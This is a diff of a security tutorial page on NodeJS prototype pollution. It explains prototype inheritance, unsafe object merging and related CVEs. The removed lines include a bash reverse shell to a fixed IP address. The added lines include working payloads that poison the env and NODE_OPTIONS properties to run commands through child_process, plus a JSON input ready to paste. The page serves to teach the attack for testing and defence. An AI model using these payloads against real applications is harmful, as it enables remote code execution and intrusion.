@@ -1,7 +1,5 @@
 # NodeJS - Prototype Pollution
 
-**This post is based on the one from** [**https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7**](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)\*\*\*\*
-
 ## Objects in JavaScript <a id="053a"></a>
 
 First of all, we need to understand `Object`in JavaScript. An object is simply a collection of key and value pairs, often called properties of that object. For example:
@@ -120,15 +118,26 @@ person1.constructor.prototype.sayHello = function(){console.log("Hello");}
 person1.constructor.prototype.newConstant = true
 ```
 
-**In this case only the objects created from the `person` class will be affected, but each of them will now inherit the properties `sayHello` and `newConstant`.**
+In this case only the **objects created from the `person`** class will be affected, but each of them will now i**nherit the properties `sayHello` and `newConstant`**.
 
-However, there is a possibility to use this technique and pollute every JS object, and it's managing to pollute the prototype property of Object:
+**There are 2 ways to abuse prototype pollution to poison EVERY JS object.**
+
+The first one would be to pollute the property prototype of **Object** \(as it was mentioned before every JS object inherits from this one\):
 
 ```javascript
-Object.prototype.sayBye = function() {console.log("bye!")}
+Object.prototype.sayBye = function(){console.log("bye!")}
 ```
 
 If you manage to do that, each JS object will be able to execute the function `sayBye`.
+
+The other way is to poison the prototype of a constructor of a dictionary variable like in the following example:
+
+```javascript
+something = {"a": "b"}
+something.constructor.prototype.sayHey = function(){console.log("Hey!")}
+```
+
+After executing that code, **each JS object will be able to execute the function `sayHey`**.
 
 ## Examples
 
@@ -188,15 +197,40 @@ let proc = fork('VersionCheck.js', [], {
 
 You can observe that the merge function is coping one by one all the key-value pairs from a dictionary into another one. This may seem secure, but it isn't as the copy of the `__proto__` or `prototype` properties from a dictionary into an object may modify completely the structure of the rest of the JS objects \(as it was previously explained\).
 
-In order to achieve RCE
+#### RCE abusing environmental variables
 
-### CVE-2019-7609
+This trick was taken from [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/).  
+Basically, **if a new process** using node is **spawned** and you are able to **poison the environmental variables** it's possible to **execute arbitrary commands**.  
+It's also **possible to poison environmental variables** y setting the **`env`** property in some object inside JS.  
+For more information about why this works read the previously indicated URL.
 
-In [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/) you can see a way to exploit this vulnerability and obtain a RCE abusing environmental variables:
+You can poison all the objects `env` property abusing `__proto__`:
 
 ```javascript
-env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//'
-env.NODE_OPTIONS='--require /proc/self/environ'
+b.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/hackermate').toString())//"}
+b.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
+let proc = fork('VersionCheck.js', [], {
+    stdio: ['ignore', 'pipe', 'pipe', 'ipc']
+});
+```
+
+Or all the objects  abusing `prototype`from a dictionary `constructor`:
+
+```javascript
+b = {"name": "Cat"}
+b.constructor.prototype.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/hacktricks').toString())//"}
+b.constructor.prototype.NODE_OPTIONS = "--require /proc/self/environ"
+let proc = fork('VersionCheck.js', [], {
+    stdio: ['ignore', 'pipe', 'pipe', 'ipc']
+});
+```
+
+Executing any of the **last 2 chunks of code** \(and creating some `VersionCheck.js` file\) the file `/tmp/hacktricks` is going to be created.
+
+Going back to the initial example if you substitute the `USERINPUT` with the following line arbitrary command execution will be achieved:
+
+```javascript
+{"name":"Cat","constructor":{"prototype":{"env":{ "EVIL":"console.log(require('child_process').execSync('touch /tmp/hacktricks').toString())//"},"NODE_OPTIONS":"--require /proc/self/environ"}}}
 ```
 
 ### CVE-2019–11358: Prototype pollution attack through jQuery $ .extend
@@ -249,4 +283,5 @@ This bug affects all versions of Lodash, already fixed in version 4.17.11.
 
 * [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
 * [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
+* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
 
